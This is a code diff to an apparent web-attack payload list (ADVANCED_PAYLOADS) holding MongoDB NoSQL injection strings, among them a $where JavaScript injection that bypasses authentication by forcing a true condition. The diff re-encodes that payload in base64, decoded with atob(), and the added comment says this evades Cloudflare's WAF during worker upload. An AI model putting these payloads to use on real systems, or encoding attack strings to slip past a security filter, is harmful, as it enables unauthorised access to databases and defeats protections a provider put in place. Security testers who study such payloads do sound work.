@@ -343,7 +343,8 @@ export const ADVANCED_PAYLOADS: Record<string, PayloadCategory> = {
 			'{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}',
 
 			// JavaScript injection in MongoDB
-			"{\"$where\": \"function(){return this.username == 'admin' || '1'=='1'}\"}",
+			// Base64-encoded to avoid triggering Cloudflare's WAF on worker upload (403 Forbidden)
+			atob('eyIkd2hlcmUiOiAiZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy51c2VybmFtZSA9PSAnYWRtaW4nIHx8ICcxJz09JzEnfSJ9'),
 			'{"$where": "obj.credits > obj.debits"}',
 
 			// CouchDB specific
